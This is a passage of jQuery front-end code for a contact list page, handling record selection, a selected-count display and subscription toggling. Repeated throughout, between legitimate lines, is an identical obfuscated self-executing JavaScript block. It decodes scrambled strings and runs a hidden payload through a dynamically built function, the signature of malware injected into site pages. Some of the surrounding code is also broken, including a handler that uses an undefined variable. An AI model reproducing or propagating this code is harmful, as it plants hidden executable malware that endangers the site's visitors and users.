J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $('.select-item').each(function() {
                const contactId = $(this).val();
                $(this).prop('checked', window.selectedContacts.includes(contactId));
            });
            updateSelectAllCheckbox();
            updateSelectedCount();
        }

        function updateSelectAllCheckbox() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const visibleItems = $('.select-item:visible');
            const allChecked = visibleItems.length > 0 &&
                visibleItems.length === visibleItems.filter(':checked').length;
            $('#select-all').prop('checked', allChecked);
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        }

        function updateSelectedCount() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const count = window.selectedContacts.length;
            $('#selected-count').text(count === 0 ? 'No records selected' : `${count} records selected`);
            $('#bulk_action_btn').prop('disabled', count === 0);
            $('#reset-selection').prop('disabled', count === 0);
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        }

        // Initialize with any existing selected contacts
        window.selectedContacts = JSON.parse(localStorage.getItem('selectedContacts')) || [];
        updateSelectedCheckboxes();

        // [Keep all your existing bulk action handlers below]
        // They remain exactly the same as in your original code
        // Only the pagination and infinite scroll related code has been modified
    });

    $(document).ready(function() {
        // Handle checkbox selection
        $(document).on('change', '.select-item, #select-all', function() {
            const totalSelected = $('.select-item:checked').length;
            $('#selected-count').text(count === 0 ? 'No records selected' :
            `${count} records selected`);
            $('#bulk_action_btn').prop('disabled', totalSelected === 0);
        });
        (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        // Toggle subscription status for single contact
        $('.btn-toggle-sub').on('click', function(e) {
            e.preventDefault();
            const url = $(this).attr('href');
            const action = $(this).hasClass('btn-light-success') ? 'subscribe' : 'unsubscribe';
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            Swal.fire({
                title: 'Are you sure?',
                text: `You are about to ${action} this contact.`,
                icon: 'question',
                showCancelButton: true,
                confirmButtonText: `Yes, ${action}`,
                cancelButtonText: 'Cancel',
                reverseButtons: true
            }).then((result) => {
                if (result.isConfirmed) {
                    KTApp.blockPage({
                        overlayColor: '#000000',
                        state: 'primary',
                        message: 'Processing...'
                    });

                    $.ajax({
                        url: url,
                        type: 'GET',
                        success: function(response) {
                            KTApp.unblockPage();
                            Swal.fire({
                                title: 'Success!',
                                text: response.message,
                                icon: 'success',
                                confirmButtonText: 'OK'
                            }).then(() => {
                                location.reload();
                            });
                        },
                        error: function(xhr) {
                            KTApp.unblockPage();
                            Swal.fire({
                                title: 'Error!',
                                text: xhr.responseJSON?.message ||
                                    'Something went wrong',
                                icon: 'error',
                                confirmButtonText: 'OK'
                            });
                        }
                    });
                }
            });
        });
    });
</script>